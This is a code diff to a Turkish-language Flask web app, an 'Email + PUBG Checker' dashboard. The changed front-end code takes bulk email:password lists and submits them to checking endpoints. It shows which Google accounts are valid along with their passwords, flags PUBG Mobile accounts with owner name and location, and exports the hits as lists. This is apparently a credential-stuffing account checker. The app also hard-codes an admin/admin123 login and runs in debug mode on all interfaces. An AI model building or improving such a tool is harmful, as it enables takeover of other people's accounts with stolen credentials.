-                            {{ '✅ Geçerli' if email.valid else '❌ Geçersiz' }}
+                        <span class="status {{ 'valid' if item.valid else 'invalid' }}">
+                            {{ '✅ Geçerli' if item.valid else '❌ Geçersiz' }}
                         </span>
-                        {% if email.is_pubg %}<span class="status pubg">🎯 PUBG</span>{% endif %}
+                        {% if item.is_pubg %}<span class="status pubg">🎯 PUBG</span>{% endif %}
                     </span>
                 </div>
                 {% endfor %}
@@ -1090,7 +1017,10 @@ DASHBOARD_HTML = """
     </div>
     
     <script>
-        // Tekli Kontrol
+        function showResult(id, html) {
+            document.getElementById(id).innerHTML = html;
+        }
+        
         async function checkSingle() {
             const email = document.getElementById('singleEmail').value.trim();
             const password = document.getElementById('singlePassword').value.trim();
@@ -1101,7 +1031,7 @@ DASHBOARD_HTML = """
             const resultDiv = document.getElementById('singleResult');
             btn.textContent = '⏳ Kontrol ediliyor...';
             btn.disabled = true;
-            resultDiv.innerHTML = '<div style="color:#888;">Kontrol ediliyor...</div>';
+            resultDiv.innerHTML = '<div class="loading">⏳ Kontrol ediliyor...</div>';
             
             try {
                 const res = await fetch('/api/check', {
@@ -1113,19 +1043,33 @@ DASHBOARD_HTML = """
                 
                 if (data.success) {
                     const r = data.result;
-                    let html = `<div style="color:#00ff88;">✅ Kontrol tamamlandı!</div>`;
-                    html += `<div>📧 ${r.email}</div>`;
-                    html += `<div>Durum: ${r.valid ? '✅ GEÇERLİ' : '❌ GEÇERSİZ'}</div>`;
+                    let html = `<div style="background:#0a0a0a;padding:15px;border-radius:8px;border:1px solid #333;">`;
+                    html += `<div style="color:#00ff88;">✅ Kontrol tamamlandı!</div>`;
+                    html += `<div>📧 <strong>${r.email}</strong></div>`;
+                    html += `<div>🔑 ${r.password || 'Girilmedi'}</div>`;
+                    html += `<div>📊 Durum: ${r.valid ? '✅ GEÇERLİ' : '❌ GEÇERSİZ'}</div>`;
+                    
                     if (r.is_pubg) {
-                        html += `<div style="color:#ff6b00;">🎯 PUBG Mobile HESABI BULUNDU!</div>`;
+                        html += `<div style="color:#ff6b00;font-weight:bold;font-size:16px;">🎯 PUBG Mobile HESABI BULUNDU!</div>`;
                         if (r.pubg_details) {
-                            html += `<div>📬 PUBG Mail: ${r.pubg_details.total_pubg_mails}</div>`;
+                            html += `<div>📬 PUBG Mail Sayısı: ${r.pubg_details.total_pubg_mails}</div>`;
                             html += `<div>👤 İsim: ${r.pubg_details.name}</div>`;
                             html += `<div>📍 Konum: ${r.pubg_details.location}</div>`;
+                            if (r.pubg_details.domain_counts) {
+                                html += `<div style="font-size:12px;color:#888;">Domainler: `;
+                                for (const [domain, count] of Object.entries(r.pubg_details.domain_counts)) {
+                                    html += `${domain}: ${count} `;
+                                }
+                                html += `</div>`;
+                            }
                         }
+                    } else if (r.checks && r.checks.pubg) {
+                        html += `<div style="color:#888;">${r.checks.pubg.message}</div>`;
                     }
+                    
+                    html += `</div>`;
                     resultDiv.innerHTML = html;
-                    setTimeout(() => location.reload(), 2000);
+                    setTimeout(() => location.reload(), 3000);
                 } else {
                     resultDiv.innerHTML = `<div style="color:#ff0044;">❌ Hata: ${data.error}</div>`;
                 }
@@ -1137,45 +1081,47 @@ DASHBOARD_HTML = """
             }
         }
         
-        // Toplu Kontrol
         async function checkBulk() {
             const text = document.getElementById('bulkEmails').value.trim();
             if (!text) { alert('Hesap listesi girin!'); return; }
             
-            const items = text.split('\\n').map(l => l.trim()).filter(l => l);
-            if (!items.length) { alert('Hesap bulunamadı!'); return; }
+            const lines = text.split('\\n').map(l => l.trim()).filter(l => l);
+            if (!lines.length) { alert('Hesap bulunamadı!'); return; }
             
-            const parsed = items.map(line => {
+            const items = lines.map(line => {
                 if (line.includes(':')) {
-                    const [email, password] = line.split(':', 1);
-                    return { email: email.trim(), password: password ? password.trim() : '' };
+                    const idx = line.indexOf(':');
+                    return { email: line.substring(0, idx).trim(), password: line.substring(idx + 1).trim() };
                 }
                 return { email: line, password: '' };
             }).filter(item => item.email && item.email.includes('@'));
             
-            if (!parsed.length) { alert('Geçerli email bulunamadı!'); return; }
-            if (parsed.length > 100) { alert('Maksimum 100 hesap!'); return; }
+            if (!items.length) { alert('Geçerli email bulunamadı!'); return; }
+            if (items.length > 50) { alert('Maksimum 50 hesap!'); return; }
             
             const btn = event.target;
             const resultDiv = document.getElementById('bulkResult');
-            btn.textContent = `⏳ ${parsed.length} hesap kontrol ediliyor...`;
+            btn.textContent = `⏳ ${items.length} hesap kontrol ediliyor...`;
             btn.disabled = true;
-            resultDiv.innerHTML = `<div style="color:#888;">${parsed.length} hesap kontrol ediliyor...</div>`;
+            resultDiv.innerHTML = `<div class="loading">⏳ ${items.length} hesap kontrol ediliyor...</div>`;
             
             try {
                 const res = await fetch('/api/check-bulk', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ items: parsed })
+                    body: JSON.stringify({ items })
                 });
                 const data = await res.json();
                 
                 if (data.success) {
-                    let html = `<div style="color:#00ff88;">✅ ${data.total} hesap kontrol edildi!</div>`;
+                    let html = `<div style="background:#0a0a0a;padding:15px;border-radius:8px;border:1px solid #333;">`;
+                    html += `<div style="color:#00ff88;">✅ ${data.total} hesap kontrol edildi!</div>`;
                     html += `<div>✅ Geçerli: ${data.valid_count}</div>`;
                     html += `<div>🎯 PUBG: ${data.pubg_count}</div>`;
+                    html += `<div style="font-size:12px;color:#888;margin-top:10px;">Sayfa yenileniyor...</div>`;
+                    html += `</div>`;
                     resultDiv.innerHTML = html;
-                    setTimeout(() => location.reload(), 2000);
+                    setTimeout(() => location.reload(), 3000);
                 } else {
                     resultDiv.innerHTML = `<div style="color:#ff0044;">❌ Hata: ${data.error}</div>`;
                 }
@@ -1187,7 +1133,6 @@ DASHBOARD_HTML = """
             }
         }
         
-        // Dışa Aktar
         async function exportEmails() {
             try {
                 const res = await fetch('/api/export');
@@ -1197,7 +1142,10 @@ DASHBOARD_HTML = """
                     const a = document.createElement('a');
                     a.href = url;
                     a.download = 'valid_emails.txt';
+                    document.body.appendChild(a);
                     a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
                 } else {
                     alert('❌ ' + (await res.text()));
                 }
@@ -1213,7 +1161,10 @@ DASHBOARD_HTML = """
                     const a = document.createElement('a');
                     a.href = url;
                     a.download = 'pubg_emails.txt';
+                    document.body.appendChild(a);
                     a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
                 } else {
                     alert('❌ ' + (await res.text()));
                 }
@@ -1226,8 +1177,10 @@ DASHBOARD_HTML = """
                 const text = await res.text();
                 if (text.includes('error')) { alert('❌ ' + text); return; }
                 await navigator.clipboard.writeText(text);
-                alert('📋 Email\'ler kopyalandı!');
-            } catch(e) { alert('❌ Hata: ' + e); }
+                alert('📋 ' + text.split('\\n').filter(l => l).length + ' email kopyalandı!');
+            } catch(e) {
+                alert('❌ Kopyalama hatası: ' + e);
+            }
         }
         
         async function clearData() {
@@ -1247,7 +1200,7 @@ DASHBOARD_HTML = """
 if __name__ == "__main__":
     init_data_dir()
     
-    # Varsayılan admin kullanıcısı
+    # Varsayılan admin
     users = load_users()
     if not users:
         users["admin"] = {
@@ -1265,13 +1218,12 @@ if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     
     print("=" * 60)
-    print("🎯 Gelişmiş Email Checker + PUBG API Başlatıldı")
+    print("🎯 Email + PUBG Checker Başlatıldı")
     print("=" * 60)
     print(f"📡 Port: {port}")
-    print(f"👤 Varsayılan: admin / admin123")
-    print("📧 Google Hesap Doğrulama: Aktif")
-    print("🎯 PUBG Mobile Kontrol: Aktif")
-    print("🔐 Şifre Sıfırlama: Aktif")
+    print(f"👤 admin / admin123")
+    print("📧 Google Check: Aktif")
+    print("🎯 PUBG Check: Aktif (şifre ile)")
     print("=" * 60)
     
     app.run(host="0.0.0.0", port=port, debug=True)
